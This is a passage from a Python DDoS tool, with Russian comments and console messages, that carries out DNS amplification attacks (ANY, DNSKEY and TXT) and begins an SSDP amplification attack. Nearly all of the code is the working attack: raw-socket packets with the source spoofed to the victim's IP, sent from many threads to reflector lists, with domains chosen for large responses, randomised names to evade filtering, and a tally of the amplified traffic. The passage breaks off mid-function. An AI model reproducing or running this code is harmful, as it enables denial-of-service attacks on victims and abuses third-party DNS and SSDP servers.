        # 🚀 ЗАПУСКАЕМ ВСЕ ДОСТУПНЫЕ АТАКИ
        result = self.run_dns_attacks(target_ip, duration, num_threads)
        return result or 0

    def _resolve_domain_to_ip(self, domain):
        """Разрешает домен в IP адрес с несколькими методами"""
        # Метод 1: Через socket (самый надежный)
        try:
            print(f"🔍 Попытка 1: Разрешаем {domain} через socket...")
            ip = socket.gethostbyname(domain)
            print(f"✅ Домен {domain} разрешен в {ip} (socket)")
            return ip
        except socket.gaierror as e:
            print(f"⚠️ Socket метод не сработал: {e}")
        
        # Метод 2: Через DNS резолвер
        try:
            import dns.resolver
            resolver = dns.resolver.Resolver()
            
            # Альтернативные DNS серверы
            dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
            resolver.nameservers = dns_servers
            resolver.timeout = 2
            resolver.lifetime = 2
            
            print(f"🔍 Попытка 2: Разрешаем {domain} через публичные DNS...")
            
            answers = resolver.resolve(domain, 'A')
            for answer in answers:
                ip = str(answer)
                print(f"✅ Домен {domain} разрешен в {ip} (DNS resolver)")
                return ip
                
        except Exception as e:
            print(f"❌ DNS resolver метод не сработал: {e}")
        
        print(f"🚫 Не удалось разрешить домен {domain} ни одним методом")
        return None

    def _get_target_ip(self, target):
        """Определяет IP адрес цели (поддерживает IP и домены)"""
        import ipaddress
        try:
            # Пробуем разобрать как IP
            ipaddress.ip_address(target)
            return target
        except ValueError:
            # Если не IP, то это домен
            print(f"🔍 Разрешаем домен {target}...")
            target_ip = self._resolve_domain_to_ip(target)
            if not target_ip:
                print(f"❌ Не удалось разрешить домен {target}")
                return None
            print(f"✅ Домен {target} разрешен в {target_ip}")
            return target_ip

    def dns_amplification_attack(self, target, attack_type, duration=30, num_threads=None):
        """РЕАЛИЗАЦИЯ DNS АТАКИ - ПОДДЕРЖИВАЕТ IP, ДОМЕНЫ И ПРЯМОЙ ВВОД"""
        import threading
        import socket
        import struct
        import random
        import time
        import sys
        import os
        import ipaddress
        
        # 🔧 УЛУЧШЕННОЕ ОПРЕДЕЛЕНИЕ ЦЕЛИ
        target_ip = None
        use_domain_directly = False
        
        try:
            # Пробуем разобрать как IP
            ipaddress.ip_address(target)
            target_ip = target
            print(f"✅ Цель: IP адрес {target_ip}")
        except ValueError:
            # Если не IP, пробуем разрешить домен
            print(f"🔍 Определяем цель: {target}")
            target_ip = self._resolve_domain_to_ip(target)
            
            if not target_ip:
                print(f"⚠️ Не удалось разрешить домен {target}")
                print("🔄 Пробуем использовать домен напрямую...")
                # Используем домен как есть (для некоторых методов)
                use_domain_directly = True
                target_ip = "8.8.8.8"  # Заглушка для спуфинга
            else:
                print(f"✅ Домен {target} разрешен в {target_ip}")
        
        if use_domain_directly:
            print(f"🎯 Атака будет использовать домен {target} напрямую")
        else:
            print(f"💀 ЗАПУСК {attack_type.upper()} DNS AMPLIFICATION НА {target} -> {target_ip}")
        
        # 🔧 ПРОВЕРКА RAW SOCKETS ДО ЗАПУСКА
        def check_raw_sockets():
            """Проверяет доступность RAW sockets"""
            print("🔍 Проверка RAW sockets...")
            try:
                # Пробуем создать RAW socket
                test_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                test_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                test_sock.close()
                print("✅ RAW sockets доступны (требуются права администратора)")
                return True
            except PermissionError:
                print("❌ RAW sockets: НЕТ ПРАВ АДМИНИСТРАТОРА!")
                print("   Запустите скрипт от имени администратора")
                return False
            except OSError as e:
                print(f"❌ RAW sockets ошибка: {e}")
                return False
            except Exception as e:
                print(f"❌ RAW sockets неизвестная ошибка: {e}")
                return False
        
        # 🔧 ПРОВЕРКА ДОСТУПНОСТИ RAW SOCKETS
        if not check_raw_sockets():
            print("🚫 Атака невозможна: RAW sockets недоступны")
            print("\n💡 РЕШЕНИЕ:")
            print("   1. Запустите скрипт от имени АДМИНИСТРАТОРА")
            print("   2. Отключите антивирус/брандмауэр на время теста")
            print("   3. Используйте альтернативные методы атаки")
            return 0
        
        # 🔧 АВТОМАТИЧЕСКОЕ ПОЛУЧЕНИЕ --threads ИЗ АРГУМЕНТОВ КОМАНДНОЙ СТРОКИ
        if num_threads is None:
            try:
                if '--threads' in sys.argv:
                    idx = sys.argv.index('--threads') + 1
                    if idx < len(sys.argv):
                        num_threads = int(sys.argv[idx])
                        print(f"🎯 Количество потоков из аргументов: {num_threads}")
                    else:
                        num_threads = 20
                else:
                    num_threads = 20
            except (ValueError, IndexError):
                num_threads = 20
        
        max_threads = num_threads
        num_threads = min(num_threads, max_threads)
        
        # Загружаем усилители для конкретного типа атаки
        dns_amplifiers = self.load_dns_amplifiers(attack_type)
        if not dns_amplifiers:
            print(f"❌ Нет DNS усилителей для {attack_type.upper()} атаки!")
            return 0

        print(f"🎯 DNS серверов: {len(dns_amplifiers)}")
        print(f"⚡ Потоков: {num_threads}")
        print(f"🎯 Тип атаки: {attack_type.upper()}")

        # Определяем тип запроса на основе attack_type
        query_type_map = {
            "any": 255,     # ANY запрос
            "dnskey": 48,   # DNSKEY запрос  
            "txt": 16       # TXT запрос
        }
        
        main_query_type = query_type_map.get(attack_type, 255)
        
        # 📊 СТАТИСТИКА
        stats = {
            'queries_sent': 0,
            'packets_sent': 0,
            'errors': 0,
            'start_time': time.time(),
            'is_running': True,
            'lock': threading.Lock(),
            'last_update': time.time()
        }

        def create_dns_query(query_type=None, domain=None):
            """Создание DNS запроса для разных типов"""
            if query_type is None:
                query_type = main_query_type
            
                
            # Домены оптимизированные под разные типы запросов
            domain_map = {
                255: [  # ANY - домены с большим количеством записей
                    # 🚀 КОРНЕВЫЕ И КРУПНЫЕ ДОМЕНЫ
                    b'\x00',                              # корневая зона .
                    b'\x03com\x00',                       # com
                    b'\x03org\x00',                       # org  
                    b'\x03net\x00',                       # net
                    b'\x03edu\x00',                       # edu
                    b'\x02go\x02uk\x00',                  # go.uk
                    b'\x06google\x03com\x00',             # google.com
                    b'\x08facebook\x03com\x00',           # facebook.com
                    b'\x07youtube\x03com\x00',            # youtube.com
                    b'\x06amazon\x03com\x00',             # amazon.com
                    b'\x09microsoft\x03com\x00',          # microsoft.com
                    b'\x06apple\x03com\x00',              # apple.com
                    b'\x07twitter\x03com\x00',            # twitter.com
                    b'\x08linkedin\x03com\x00',           # linkedin.com
                    b'\x09instagram\x03com\x00',          # instagram.com
                    b'\x08wikipedia\x03org\x00',          # wikipedia.org
                    b'\x06reddit\x03com\x00',             # reddit.com
                    b'\x02is\x03org\x00',                 # isc.org
                    b'\x06cloudflare\x03com\x00',         # cloudflare.com
                    b'\x07akamai\x03com\x00',             # akamai.com
                    b'\x06github\x03com\x00',             # github.com
                    b'\x06gitlab\x03com\x00',             # gitlab.com
                    b'\x06docker\x03com\x00',             # docker.com
                    b'\x06ubuntu\x03com\x00',             # ubuntu.com
                    b'\x06debian\x03org\x00',             # debian.org
                    b'\x05apache\x03org\x00',             # apache.org
                    b'\x06kernel\x03org\x00',             # kernel.org
                    b'\x02fs\x06foundation\x00',          # fs.foundation
                    b'\x04ripe\x03net\x00',               # ripe.net
                    b'\x05arin\x03net\x00',               # arin.net
                    b'\x05icann\x03org\x00',              # icann.org
                    b'\x03ietf\x03org\x00',               # ietf.org
                    b'\x03ns1\x03com\x00',                # ns1.com
                    b'\x07dynect\x03net\x00',             # dynect.net
                    b'\x09ultradns\x03com\x00',           # ultradns.com
                    # 🚀 CDN И СЕТЕВЫЕ СЕРВИСЫ
                    b'\x07fastly\x03com\x00',             # fastly.com
                    b'\x09cloudfront\x03net\x00',         # cloudfront.net
                    b'\x0aedgesuite\x03net\x00',          # edgesuite.net
                    b'\x0aredshield\x03com\x00',          # redshield.com
                    b'\x06incapsula\x03com\x00',          # incapsula.com
                    b'\x04sucuri\x03net\x00',             # sucuri.net
                    # 🚀 КРИПТО И БЛОКЧЕЙН
                    b'\x0abitcoin\x03org\x00',            # bitcoin.org
                    b'\x09ethereum\x03org\x00',           # ethereum.org
                    b'\x08binance\x03com\x00',            # binance.com
                    b'\x05kraken\x03com\x00',             # kraken.com
                    b'\x07coinbase\x03com\x00',           # coinbase.com
                    *[bytes([len(part)]) + part.encode() + b'\x00' 
                      for part in generate_random_domains('any', count=20)]
                ],

                48: [  # DNSKEY - домены с DNSSEC
                    # 🚀 КОРНЕВЫЕ И TLD
                    b'\x00',                              # корневая зона .
                    b'\x03com\x00',                       # com
                    b'\x03org\x00',                       # org
                    b'\x03net\x00',                       # net
                    b'\x03edu\x00',                       # edu
                    b'\x03gov\x00',                       # gov
                    b'\x02mil\x00',                       # mil
                    b'\x02uk\x00',                        # uk
                    b'\x02de\x00',                        # de
                    b'\x02fr\x00',                        # fr
                    b'\x02jp\x00',                        # jp
                    b'\x03cn\x00',                        # cn
                    b'\x03ru\x00',                        # ru
                    b'\x02is\x03org\x00',                 # isc.org
                    b'\x05verisign\x03com\x00',           # verisign.com
                    b'\x06google\x03com\x00',             # google.com
                    b'\x08facebook\x03com\x00',           # facebook.com
                    b'\x09microsoft\x03com\x00',          # microsoft.com
                    b'\x06apple\x03com\x00',              # apple.com
                    b'\x06amazon\x03com\x00',             # amazon.com
                    b'\x06cloudflare\x03com\x00',         # cloudflare.com
                    b'\x04ns1\x03com\x00',                # ns1.com
                    b'\x06akamai\x03net\x00',             # akamai.net
                    b'\x05dynect\x03net\x00',             # dynect.net
                    b'\x07ultradns\x03com\x00',           # ultradns.com
                    b'\x08opendns\x03com\x00',            # opendns.com
                    b'\x07quad9\x03net\x00',              # quad9.net
                    b'\x02go\x06ogle\x03com\x00',         # go.ogle.com
                    b'\x04gmail\x03com\x00',              # gmail.com
                    b'\x06yahoo\x03com\x00',              # yahoo.com
                    b'\x07outlook\x03com\x00',            # outlook.com
                    b'\x05icann\x03org\x00',              # icann.org
                    b'\x04ripe\x03net\x00',               # ripe.net
                    b'\x06arin\x03net\x00',               # arin.net
                    b'\x05lacnic\x03net\x00',             # lacnic.net
                    b'\x06afrinic\x03net\x00',            # afrinic.net
                    # 🚀 ФИНАНСОВЫЕ И БАНКОВСКИЕ
                    b'\x04wells\x06fargo\x03com\x00',     # wells.fargo.com
                    b'\x04bank\x06ofamerica\x03com\x00',  # bank.ofamerica.com
                    b'\x05chase\x03com\x00',              # chase.com
                    b'\x05citi\x03com\x00',               # citi.com
                    b'\x03hsbc\x03com\x00',               # hsbc.com
                    *[bytes([len(part)]) + part.encode() + b'\x00'
                      for part in generate_random_domains('dnskey', count=15)]
                ],

                16: [  # TXT - домены с большими TXT записями
                    # 🚀 ОЧЕНЬ БОЛЬШИЕ TXT (1KB+)
                    b'\x0b_cloudflare\x04auth\x03key\x05site\x00',        # _cloudflare.auth.key.site
                    b'\x13_dmarc\x0bpaypal-inc\x03com\x00',              # _dmarc.paypal-inc.com
                    b'\x15_globalsign-smime\x05dv\x03com\x00',           # _globalsign-smime.dv.com
                    b'\x14_selectors_domainkey\x06google\x03com\x00',    # selectors._domainkey.google.com
                    b'\x19_selectors_domainkey\x08facebook\x03com\x00',  # selectors._domainkey.facebook.com
                    b'\x0e_domainkey\x09microsoft\x03com\x00',           # _domainkey.microsoft.com
                    b'\x0fselector1_domainkey\x06yahoo\x03com\x00',      # selector1._domainkey.yahoo.com
                    b'\x0fselector2_domainkey\x06yahoo\x03com\x00',      # selector2._domainkey.yahoo.com
                    b'\x13_hashed-domainkey\x06google\x03com\x00',       # _hashed-domainkey.google.com
                    b'\x0e_carddav_tcp\x06google\x03com\x00',            # _carddav_tcp.google.com
                    b'\x0e_caldav_tcp\x06google\x03com\x00',             # _caldav_tcp.google.com
                    b'\x12_caldav_tcp\x07twitter\x03com\x00',            # _caldav_tcp.twitter.com
                    b'\x0f_imap_tcp\x07twitter\x03com\x00',              # _imap_tcp.twitter.com
                    b'\x0f_smtp_tcp\x07twitter\x03com\x00',              # _smtp_tcp.twitter.com
                    b'\x0f_pop3_tcp\x07twitter\x03com\x00',              # _pop3_tcp.twitter.com
                    b'\x0e_ldap_tcp\x07twitter\x03com\x00',              # _ldap_tcp.twitter.com
                    b'\x15_apple-domain-verification\x06apple\x03com\x00', # _apple-domain-verification.apple.com
                    b'\x1a_amazonses-domain-verification\x06amazon\x03com\x00', # _amazonses-domain-verification.amazon.com
                    b'\x19_google-domain-verification\x06google\x03com\x00', # _google-domain-verification.google.com
                    b'\x1b_microsoft-domain-verification\x09microsoft\x03com\x00', # _microsoft-domain-verification.microsoft.com
                    b'\x18_facebook-domain-verification\x08facebook\x03com\x00', # _facebook-domain-verification.facebook.com
                    # 🚀 БОЛЬШИЕ TXT (500B-1KB)
                    b'\x0d_dmarc\x06google\x03com\x00',                  # _dmarc.google.com
                    b'\x0c_globalsign\x09comodoca\x03com\x00',           # _globalsign.comodoca.com
                    b'\x0d_spf\x06google\x03com\x00',                    # _spf.google.com
                    b'\x08_dmarc\x04gmail\x03com\x00',                   # _dmarc.gmail.com
                    b'\x08_dmarc\x06yahoo\x03com\x00',                   # _dmarc.yahoo.com
                    b'\x0a_dmarc\x07outlook\x03com\x00',                 # _dmarc.outlook.com
                    b'\x09_dmarc\x08facebook\x03com\x00',                # _dmarc.facebook.com
                    b'\x0a_dmarc\x07twitter\x03com\x00',                 # _dmarc.twitter.com
                    b'\x0a_dmarc\x09microsoft\x03com\x00',               # _dmarc.microsoft.com
                    b'\x08_dmarc\x06apple\x03com\x00',                   # _dmarc.apple.com
                    b'\x09_dmarc\x06amazon\x03com\x00',                  # _dmarc.amazon.com
                    b'\x0b_domainkey\x06google\x03com\x00',              # _domainkey.google.com
                    b'\x0c_domainkey\x08facebook\x03com\x00',            # _domainkey.facebook.com
                    b'\x0d_domainkey\x09microsoft\x03com\x00',           # _domainkey.microsoft.com
                    b'\x0a_domainkey\x06yahoo\x03com\x00',               # _domainkey.yahoo.com
                    b'\x0b_domainkey\x06apple\x03com\x00',               # _domainkey.apple.com
                    # 🚀 СРЕДНИЕ TXT (200B-500B)
                    b'\x08facebook\x03com\x00',                          # facebook.com
                    b'\x06google\x03com\x00',                            # google.com
                    b'\x07youtube\x03com\x00',                           # youtube.com
                    b'\x06apple\x03com\x00',                             # apple.com
                    b'\x06amazon\x03com\x00',                            # amazon.com
                    b'\x09microsoft\x03com\x00',                         # microsoft.com
                    b'\x07twitter\x03com\x00',                           # twitter.com
                    b'\x08linkedin\x03com\x00',                          # linkedin.com
                    b'\x09instagram\x03com\x00',                         # instagram.com
                    b'\x06reddit\x03com\x00',                            # reddit.com
                    b'\x06github\x03com\x00',                            # github.com
                    b'\x06gitlab\x03com\x00',                            # gitlab.com
                    b'\x08dropbox\x03com\x00',                           # dropbox.com
                    b'\x07spotify\x03com\x00',                           # spotify.com
                    b'\x06netflix\x03com\x00',                           # netflix.com
                    b'\x04slack\x03com\x00',                             # slack.com
                    b'\x07discord\x03com\x00',                           # discord.com
                    b'\x07telegram\x03org\x00',                          # telegram.org
                    b'\x08whatsapp\x03com\x00',                          # whatsapp.com
                    b'\x05skype\x03com\x00',                             # skype.com
                    b'\x04zoom\x03us\x00',                               # zoom.us
                    b'\x07shopify\x03com\x00',                           # shopify.com
                    b'\x04stripe\x03com\x00',                            # stripe.com
                    b'\x06paypal\x03com\x00',                            # paypal.com
                    b'\x05venmo\x03com\x00',                             # venmo.com
                    b'\x06square\x03com\x00',                            # square.com
                    # 🚀 ДОПОЛНИТЕЛЬНЫЕ МОЩНЫЕ
                    b'\x0f_verification\x06google\x03com\x00',           # _verification.google.com
                    b'\x10_verification\x08facebook\x03com\x00',         # _verification.facebook.com
                    b'\x11_verification\x09microsoft\x03com\x00',        # _verification.microsoft.com
                    b'\x0e_verification\x06apple\x03com\x00',            # _verification.apple.com
                    b'\x0e_verification\x06amazon\x03com\x00',           # _verification.amazon.com
                    b'\x0e_site-verification\x06google\x03com\x00',      # site-verification.google.com
                    b'\x0f_site-verification\x08facebook\x03com\x00',    # site-verification.facebook.com
                    b'\x10_site-verification\x09microsoft\x03com\x00',   # site-verification.microsoft.com
                    b'\x0d_site-verification\x06apple\x03com\x00',       # site-verification.apple.com
                    b'\x0d_site-verification\x06amazon\x03com\x00',      # site-verification.amazon.com
                    b'\x12_always-online\x06google\x03com\x00',          # _always-online.google.com
                    b'\x13_always-online\x08facebook\x03com\x00',        # _always-online.facebook.com
                    b'\x0e_acme-challenge\x06google\x03com\x00',         # _acme-challenge.google.com
                    b'\x0f_acme-challenge\x08facebook\x03com\x00',       # _acme-challenge.facebook.com
                    b'\x10_acme-challenge\x09microsoft\x03com\x00',      # _acme-challenge.microsoft.com
                    b'\x0d_acme-challenge\x06apple\x03com\x00',          # _acme-challenge.apple.com
                    b'\x0d_acme-challenge\x06amazon\x03com\x00',         # _acme-challenge.amazon.com
                    *[bytes([len(part)]) + part.encode() + b'\x00'
                      for part in generate_random_domains('txt', count=25)]
                ]
            }
            
            # СЛУЧАЙНЫЙ ВЫБОР ДОМЕНА
            if domain is None:
                domain = random.choice(domain_map[query_type])
            
            transaction_id = random.randint(0, 65535)
            flags = random.choice([0x0100, 0x0000, 0x8000])
            
            header = struct.pack('>HHHHHH', transaction_id, flags, 1, 0, 0, 0)
            question = domain + struct.pack('>HH', query_type, 1)
            return header + question

        def generate_random_domains(query_type, count=100):
            """Генерация случайных доменов для обхода защиты"""
            base_domains = {
                'any': ['com', 'org', 'net', 'info', 'biz', 'online'],
                'dnskey': ['com', 'org', 'net', 'gov', 'edu'], 
                'txt': ['com', 'org', 'net', 'app', 'dev']
            }
            
            prefixes = {
                'any': ['cdn', 'api', 'static', 'media', 'assets', 'img', 'js', 'cache'],
                'dnskey': ['dns', 'ns', 'key', 'auth', 'secure', 'verify'],
                'txt': ['verify', 'auth', 'key', 'token', 'sig', 'cert', 'val']
            }
            
            domains = []
            for _ in range(count):
                prefix = random.choice(prefixes[query_type])
                base = random.choice(base_domains[query_type])
                random_suffix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
                
                # РАЗНЫЕ ФОРМАТЫ ДОМЕНОВ
                formats = [
                    f"{prefix}-{random_suffix}.{base}",
                    f"{random_suffix}.{prefix}.{base}", 
                    f"{prefix}{random_suffix}.{base}",
                    f"{random_suffix}-{prefix}.{base}"
                ]
                
                domains.append(random.choice(formats))
            
            return domains

        def send_spoofed_queries(thread_id):
            """Отправка спуфинг запросов"""
            local_sent = 0
            local_packets = 0
            local_errors = 0
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            except Exception as e:
                print(f"❌ Поток {thread_id}: Не удалось создать RAW socket: {e}")
                return

            batch_size = 10  # Уменьшаем для стабильности
            
            while stats['is_running'] and (time.time() - stats['start_time']) < duration:
                try:
                    for _ in range(batch_size):
                        dns_server = random.choice(dns_amplifiers)[0]
                        dns_query = create_dns_query()
                        
                        # Создаем IP заголовок с подменой источника
                        ip_header = struct.pack('!BBHHHBBH4s4s',
                                            0x45, 0, 20 + 8 + len(dns_query),  # Версия, TOS, длина
                                            random.randint(0, 65535), 0,       # ID, флаги
                                            255, socket.IPPROTO_UDP, 0,        # TTL, протокол, checksum
                                            socket.inet_aton(target_ip),       # ИСТОЧНИК = цель атаки
                                            socket.inet_aton(dns_server))      # Назначение = DNS сервер
                        
                        # UDP заголовок
                        udp_header = struct.pack('!HHHH', 
                                               random.randint(1024, 65535), 53, 
                                               8 + len(dns_query), 0)
                        
                        packet = ip_header + udp_header + dns_query
                        
                        try:
                            sock.sendto(packet, (dns_server, 53))
                            local_sent += 1
                            local_packets += 1
                        except Exception as e:
                            local_errors += 1
                            continue
                    
                    # Обновляем статистику каждые 100 пакетов
                    if local_sent >= 100:
                        with stats['lock']:
                            stats['queries_sent'] += local_sent
                            stats['packets_sent'] += local_packets
                            stats['errors'] += local_errors
                        local_sent = 0
                        local_packets = 0
                        local_errors = 0
                        
                except Exception as e:
                    local_errors += 1
                    continue
            
            # Финальное обновление
            with stats['lock']:
                stats['queries_sent'] += local_sent
                stats['packets_sent'] += local_packets
                stats['errors'] += local_errors
            
            sock.close()

        # 🚀 ЗАПУСК ПОТОКОВ
        print(f"🚀 Запуск {num_threads} потоков...")
        threads = []
        for i in range(num_threads):
            thread = threading.Thread(target=send_spoofed_queries, args=(i+1,))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        # 📊 МОНИТОРИНГ
        def monitor_progress():
            last_queries = 0
            last_time = time.time()
            
            print(f"\n📊 МОНИТОРИНГ АТАКИ:")
            print("Время | Запросы | QPS | Ошибки | Потоки | Трафик GB | МБ/с")
            print("-" * 80)
            
            while stats['is_running']:
                current_time = time.time()
                elapsed = current_time - stats['start_time']
                
                if elapsed >= duration:
                    break
                    
                with stats['lock']:
                    current_queries = stats['queries_sent']
                    current_errors = stats['errors']
                    current_packets = stats['packets_sent']
                
                time_diff = current_time - last_time
                if time_diff >= 1.0:  # Обновляем каждую секунду
                    qps = (current_queries - last_queries) / time_diff
                    
                    # Расчет усиленного трафика (предполагаем 4KB на ответ)
                    amplified_traffic_gb = (current_queries * 4096) / 1024 / 1024 / 1024
                    
                    # Расчет скорости в МБ/с (текущая скорость, а не общая)
                    current_speed_mbps = ((current_queries - last_queries) * 4096) / 1024 / 1024  # МБ за последнюю секунду
                    
                    # Цветовые коды для разных типов атак
                    colors = {"ANY": "🔵ANY", "DNSKEY": "🟢DNSKEY", "TXT": "🟣TXT"}
                    color = colors.get(attack_type.upper(), "⚪")
                    
                    print(f"{color} {elapsed:5.1f}s | {current_queries:7,} | {qps:4.0f} | {current_errors:4} | {num_threads:3} потоков | {amplified_traffic_gb:5.2f} GB | {current_speed_mbps:5.1f} МБ/с")
                    
                    last_queries = current_queries
                    last_time = current_time
                
                time.sleep(1)
        
        monitor_thread = threading.Thread(target=monitor_progress)
        monitor_thread.daemon = True
        monitor_thread.start()

        # ⏳ ОЖИДАНИЕ ЗАВЕРШЕНИЯ
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print(f"\n⏹️  Атака {attack_type.upper()} прервана пользователем")
        
        stats['is_running'] = False
        time.sleep(2)  # Даем потокам время завершиться

        # 📊 ФИНАЛЬНАЯ СТАТИСТИКА
        total_time = time.time() - stats['start_time']
        
        print(f"\n🎯 РЕЗУЛЬТАТЫ {attack_type.upper()} АТАКИ:")
        print(f"📤 Запросов отправлено: {stats['queries_sent']:,}")
        print(f"📦 Пакетов отправлено: {stats['packets_sent']:,}")
        print(f"❌ Ошибок: {stats['errors']:,}")
        print(f"⏱️  Общее время: {total_time:.1f} секунд")
        
        if stats['queries_sent'] > 0:
            qps = stats['queries_sent'] / total_time
            amplified_traffic_gb = (stats['queries_sent'] * 4096) / 1024 / 1024 / 1024
            amplified_traffic_mbps = (stats['queries_sent'] * 4096 * 8) / total_time / 1_000_000
            
            print(f"⚡ Средний QPS: {qps:.0f}")
            print(f"💥 Усиленный трафик: {amplified_traffic_gb:.2f} GB")
            print(f"🌐 Пропускная способность: {amplified_traffic_mbps:.1f} Mbps")
        
        return stats['queries_sent']

    def run_dns_attacks(self, target, duration=30, num_threads=None):
        """Запускает все доступные DNS атаки ПАРАЛЛЕЛЬНО"""
        # Добавьте эти строки в начало метода:
        target_ip = self._get_target_ip(target)
        if not target_ip:
            return 0
        
        # Остальной код метода остается без изменений
        import os
        import time
        import threading
        
        print("🔍 Проверяем доступные DNS атаки...")
        
        attacks_to_run = []
        
        # Проверяем какие атаки могут работать
        if os.path.exists("dns_any.txt"):
            attacks_to_run.append(("ANY", self.dns_any_attack))
            print("✅ ANY атака доступна")
        
        if os.path.exists("dns_dnskey.txt"):
            attacks_to_run.append(("DNSKEY", self.dns_dnskey_attack))
            print("✅ DNSKEY атака доступна")
        
        if os.path.exists("dns_txt.txt"):
            attacks_to_run.append(("TXT", self.dns_txt_attack))
            print("✅ TXT атака доступна")
        
        if not attacks_to_run:
            print("🚫 Нет доступных DNS атак!")
            return 0
        
        print(f"\n🚀 Запускаем {len(attacks_to_run)} доступных атак ПАРАЛЛЕЛЬНО...")
        
        total_start_time = time.time()
        results = []
        results_lock = threading.Lock()
        
        def run_attackdns(attack_name, attack_func):
            """Запускает одну атаку в отдельном потоке"""
            try:
                print(f"\n{'='*50}")
                print(f"💀 ЗАПУСК {attack_name} АТАКИ")
                print(f"{'='*50}")
                
                # ИСПРАВЛЕНИЕ: передаем target (оригинальный параметр), а не target_ip
                result = attack_func(target, duration, num_threads)
                
                with results_lock:
                    results.append((attack_name, result))
                    print(f"✅ {attack_name} атака завершена: {result:,} запросов")
            except Exception as e:
                with results_lock:
                    results.append((attack_name, 0))
                    print(f"❌ {attack_name} атака завершилась с ошибкой: {e}")
        
        # 🚀 ЗАПУСКАЕМ ВСЕ АТАКИ ПАРАЛЛЕЛЬНО
        threads = []
        for attack_name, attack_func in attacks_to_run:
            thread = threading.Thread(target=run_attackdns, args=(attack_name, attack_func))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # ⏳ ЖДЕМ ЗАВЕРШЕНИЯ ВСЕХ АТАК
        for thread in threads:
            thread.join()
        
        total_time = time.time() - total_start_time
        
        # 📊 Сводная статистика
        print(f"\n{'='*50}")
        print("📊 СВОДНАЯ СТАТИСТИКА ВСЕХ АТАК")
        print(f"{'='*50}")
        
        total_queries = 0
        for attack_name, queries in results:
            print(f"  {attack_name}: {queries:,} запросов")
            total_queries += queries
        
        print(f"\n📤 Всего запросов: {total_queries:,}")
        print(f"⏱ Общее время: {total_time:.2f} секунд")
        
        if total_queries > 0:
            amplified_traffic_gb = (total_queries * 4096) / 1024 / 1024 / 1024
            amplified_traffic_mbps = (total_queries * 4096 * 8) / total_time / 1_000_000
            print(f"💥 Усиленный трафик: {amplified_traffic_gb:.2f} GB")
            print(f"🌐 Пропускная способность: {amplified_traffic_mbps:.1f} Mbps")
        
        print(f"\n✅ Все доступные атаки завершены за {total_time:.2f} секунд")
        return total_queries

    def _create_max_power_dns_query(self):
        """Создает МАКСИМАЛЬНЫЕ DNS запросы"""
        # Большие домены с множеством записей
        max_domains = [
            'isc.org', 'ripe.net', 'verisign.com', 
            'cloudflare.com', 'google.com', 'youtube.com',
            'facebook.com', 'amazon.com', 'microsoft.com',
            'akamai.com', 'fastly.com', 'cloudfront.net'
        ]
        domain = random.choice(max_domains)
        
        # Создаем базовый запрос
        base_query = self._create_proper_dns_any_query()
        
        # 🔥 ДОБАВЛЯЕМ ДОПОЛНИТЕЛЬНЫЕ СЕКЦИИ ДЛЯ УВЕЛИЧЕНИЯ РАЗМЕРА
        additional_sections = b''
        for i in range(random.randint(3, 8)):
            # Добавляем дополнительные вопросы
            additional_sections += struct.pack('!B', len(domain)) + domain.encode() + b'\x00'
            additional_sections += struct.pack('!HH', 255, 1)  # ANY + IN
        
        return base_query + additional_sections

    def ssdp_amplification_attack(self, target_ip, target_port=0, duration=60, num_threads=50):
        """МАКСИМАЛЬНО МОЩНАЯ SSDP AMPLIFICATION АТАКА"""
        import threading
        import socket
        import struct
        import random
        import time
        import sys
        
        print(f"💀 ЗАПУСК MAX POWER SSDP AMPLIFICATION НА {target_ip}")
        
        # 🔧 АВТОМАТИЧЕСКОЕ ПОЛУЧЕНИЕ --threads ИЗ АРГУМЕНТОВ
        if '--threads' in sys.argv:
            try:
                idx = sys.argv.index('--threads') + 1
                if idx < len(sys.argv):
                    num_threads = int(sys.argv[idx])
            except (ValueError, IndexError):
                pass
        
        ssdp_amplifiers = self.load_ssdp_amplifiers()
        if not ssdp_amplifiers:
            print("❌ Нет SSDP усилителей!")
            return 0

        print(f"🎯 SSDP усилителей: {len(ssdp_amplifiers)}")
        print(f"⚡ Потоков: {num_threads}")
        print(f"⏱️ Длительность: {duration} сек")

        # 📊 СТАТИСТИКА
        attack_stats = {
            'total_requests': 0,
            'total_bytes_sent': 0,
            'estimated_amplified_bytes': 0,
            'failed_requests': 0,
            'start_time': time.time(),
            'is_running': True,
            'lock': threading.Lock(),
            'last_update_time': time.time()
        }

        def create_ssdp_amplification_packet():
            """Создает МОЩНЫЙ SSDP запрос для максимального усиления"""
            # 💥 Разные типы запросов для обхода фильтров
            ssdp_templates = [
                # M-SEARCH запросы
                "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: {st}\r\nUSER-AGENT: UPnP/1.0\r\n\r\n",
                "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 3\r\nST: {st}\r\nUSER-AGENT: Microsoft-Windows/6.1\r\n\r\n",
                "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: {st}\r\nUSER-AGENT: Linux UPnP/1.0\r\n\r\n"
            ]
            
            # 💥 Цели для максимального ответа
            search_targets = [
                "ssdp:all",
                "upnp:rootdevice",
                "urn:schemas-upnp-org:device:InternetGatewayDevice:1",
                "urn:schemas-upnp-org:service:WANIPConnection:1",
                "urn:schemas-upnp-org:service:WANPPPConnection:1",
                "urn:schemas-upnp-org:device:MediaServer:1",
                "urn:schemas-upnp-org:service:ContentDirectory:1"
            ]
            
            template = random.choice(ssdp_templates)
            target = random.choice(search_targets)
            request = template.format(st=target)
            
            return request.encode('utf-8')

        def create_raw_udp_packet(source_ip, dest_ip, source_port, dest_port, data):
            """Создает RAW UDP пакет с IP spoofing"""
            try:
                # IP заголовок (без checksum - вычисляется драйвером)
                ip_ver = 4
                ip_ihl = 5
                ip_tos = 0
                ip_tot_len = 20 + 8 + len(data)
                ip_id = random.randint(0, 65535)
                ip_frag_off = 0
                ip_ttl = 255
